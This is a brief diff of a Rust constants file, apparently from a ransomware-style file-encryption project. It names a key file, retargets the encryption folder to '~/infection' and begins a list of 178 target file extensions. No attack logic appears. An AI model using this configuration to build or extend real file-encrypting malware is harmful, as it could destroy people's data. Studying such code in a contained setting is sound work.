@@ -1,6 +1,6 @@
 pub const VERSION: &str = "v1.0";
 pub const KEY_FILE: &str = "./stockholm.key";
-pub const TARGET_FOLDER: &str = "./my_folder";
+pub const TARGET_FOLDER: &str = "~/infection";
 pub const TARGET_EXTENSIONS: [&str; 178] = [
 	"der",
 	"pfx",
